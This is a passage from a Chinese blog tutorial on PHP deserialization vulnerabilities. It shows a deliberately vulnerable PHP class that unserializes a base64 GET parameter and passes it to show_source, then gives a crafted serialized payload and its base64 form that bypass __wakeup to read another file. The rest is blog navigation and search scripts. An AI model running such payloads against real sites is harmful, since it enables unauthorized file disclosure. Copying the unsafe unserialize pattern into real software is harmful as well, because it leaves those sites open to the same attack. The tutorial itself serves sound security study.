+<h6 id="实验八："><a href="#实验八：" class="headerlink" title="实验八："></a>实验八：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(0); </span><br><span class="line">class happy&#123; </span><br><span class="line">protected $file=&apos;index.php&apos;; </span><br><span class="line">public function __construct($file)&#123; </span><br><span class="line">$this-&gt;file=$file; </span><br><span class="line">&#125; </span><br><span class="line">function __destruct()&#123; </span><br><span class="line">if(!empty($this-&gt;file)) </span><br><span class="line">&#123; </span><br><span class="line">if(strchr($this-&gt;file,&quot;\\&quot;)===false &amp;&amp; strchr($this- </span><br><span class="line">&gt;file,&apos;/&apos;)===false) </span><br><span class="line">show_source(dirname(__FILE__).&apos;/&apos;.$this-&gt;file); </span><br><span class="line">else </span><br><span class="line">die(&apos;Wrong filename.&apos;); </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line">function __wakeup()&#123; </span><br><span class="line">$this-&gt;file=&apos;index.php&apos;; </span><br><span class="line">&#125; </span><br><span class="line">public function __toString() </span><br><span class="line">&#123; </span><br><span class="line">return &apos;&apos;; </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line">if (!isset($_GET[&apos;file&apos;]))&#123; </span><br><span class="line">show_source(&apos;index.php&apos;); </span><br><span class="line">&#125;</span><br><span class="line">else&#123; </span><br><span class="line">$file=base64_decode($_GET[&apos;file&apos;]); </span><br><span class="line">echo unserialize($file); </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>这段代码中有三个魔法函数，首先wakeup这个函数要绕过，会覆盖我们的注入，绕过方法前面已经使用过了</p>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:5:&quot;happy&quot;:2:&#123;S:7:&quot;\00*\00file&quot;;S:5:&quot;a.txt&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<p>Base64：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tzo1OiJoYXBweSI6Mjp7Uzo3OiJcMDAqXDAwZmlsZSI7Uzo1OiJhLnR4dCI7fQ==</span><br></pre></td></tr></table></figure>
+<p>这个实验需要绕过的就是wakeup这个魔法方法，另外需要注意的是序列化格式，需要使用“\00”,还有S是大写，其他的就和前面一样了</p>
+<p>关于大小写“s”</p>
+<p>s：\00a   表示4个字符</p>
+<p>S：\00a   表示2个字符</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+      <div>
+        <div id="wechat_subscriber" style="display: block; padding: 10px 0; margin: 20px auto; width: 100%; text-align: center">
+    <img id="wechat_subscriber_qcode" src="" alt="soliym wechat" style="width: 200px; max-width: 100%;">
+    <div></div>
+</div>
+
+      </div>
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    soliym
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://soliym.top/2021/06/19/反序列化原理与实例讲解/" title="反序列化原理与实例讲解">http://soliym.top/2021/06/19/反序列化原理与实例讲解/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/反序列化/" rel="tag"><i class="fa fa-tag"></i>
+ 反序列化</a>
+          
+        </div>
+      
+
+      
+      
+        <div class="post-widgets">
+        
+
+        
+
+        
+          
+          <div id="needsharebutton-postbottom">
+            <span class="btn">
+              <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </span>
+          </div>
+        
+        </div>
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/06/19/单钥密码体制一/" rel="next" title="单钥密码体制(一)">
+                <i class="fa fa-chevron-left"></i> 单钥密码体制(一)
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2021/06/19/贪心算法/" rel="prev" title="贪心算法">
+                贪心算法 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC80MTI2Ny8xNzgxNQ=="></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">soliym</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">34</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/soliym" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:soliym@163.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:531106830@qq.com" target="_blank" title="qq">
+                      
+                        <i class="fa fa-fw fa-qq"></i>qq</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://weibo.com/u/6401619515/home?leftnav=1" target="_blank" title="weibo">
+                      
+                        <i class="fa fa-fw fa-weibo"></i>weibo</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://soliym.top/" title="soliym" target="_blank">soliym</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-5"><a class="nav-link" href="#序列化与反序列化"><span class="nav-number">1.</span> <span class="nav-text">序列化与反序列化</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#使用序列化"><span class="nav-number">2.</span> <span class="nav-text">使用序列化</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#PHP的序列化和反序列化"><span class="nav-number">3.</span> <span class="nav-text">PHP的序列化和反序列化</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#PHP的魔法函数"><span class="nav-number">4.</span> <span class="nav-text">PHP的魔法函数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#反序列化漏洞实验"><span class="nav-number">5.</span> <span class="nav-text">反序列化漏洞实验</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#实验一："><span class="nav-number">5.1.</span> <span class="nav-text">实验一：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#实验二："><span class="nav-number">5.2.</span> <span class="nav-text">实验二：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#实验三："><span class="nav-number">5.3.</span> <span class="nav-text">实验三：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#实验四："><span class="nav-number">5.4.</span> <span class="nav-text">实验四：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#实验五："><span class="nav-number">5.5.</span> <span class="nav-text">实验五：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#实验六："><span class="nav-number">5.6.</span> <span class="nav-text">实验六：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#实验七："><span class="nav-number">5.7.</span> <span class="nav-text">实验七：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#实验八："><span class="nav-number">5.8.</span> <span class="nav-text">实验八：</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+     
+    </div>
+   
+  </aside>
+
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2018 &mdash; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">soliym</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+      <div id="needsharebutton-float">
+        <span class="btn">
+          <i class="fa fa-share-alt" aria-hidden="true"></i>
+        </span>
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v="></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v="></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v="></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v="></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v="></script>
+<script type="text/javascript" src="/js/src/post-details.js?v="></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v="></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+  
+  <link rel="stylesheet" href="/lib/needsharebutton/needsharebutton.css">
+
+  
+  
+  <script src="/lib/needsharebutton/needsharebutton.js"></script>
+
+  <script>
+    
+      pbOptions = {};
+      
+          pbOptions.iconStyle = "box";
+      
+          pbOptions.boxForm = "horizontal";
+      
+          pbOptions.position = "bottomCenter";
+      
+          pbOptions.networks = "Weibo,Wechat,Douban,QQZone,Twitter,Facebook";
+      
+      new needShareButton('#needsharebutton-postbottom', pbOptions);
+    
+    
+      flOptions = {};
+      
+          flOptions.iconStyle = "box";
+      
+          flOptions.boxForm = "horizontal";
+      
+          flOptions.position = "middleRight";
+      
+          flOptions.networks = "Weibo,Wechat,Douban,QQZone,Twitter,Facebook";
+      
+      new needShareButton('#needsharebutton-float', flOptions);
+    
+  </script>
+
+  
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
